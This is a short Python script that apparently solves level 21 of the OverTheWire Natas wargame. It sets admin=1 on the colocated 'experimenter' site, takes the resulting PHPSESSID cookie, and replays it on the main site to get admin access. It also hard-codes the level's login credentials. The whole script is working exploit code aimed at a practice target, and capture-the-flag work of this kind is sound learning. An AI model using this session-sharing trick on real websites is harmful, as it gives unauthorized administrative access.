import requests

URL = "http://natas21-experimenter.natas.labs.overthewire.org/?debug=true&submit=1&admin=1"
MAIN_URL = "http://natas21.natas.labs.overthewire.org/"
auth = ('natas21', '7meHZ1l2zPoK2v1qfTUxq4Ydfja4UlmU')

sesh = requests.Session()
sesh.auth = auth
resp_css = sesh.post(url = URL)
admin_cookie = resp_css.cookies['PHPSESSID']

resp_normal = sesh.post(url = MAIN_URL, cookies= {'PHPSESSID' : admin_cookie})
print(resp_normal.text)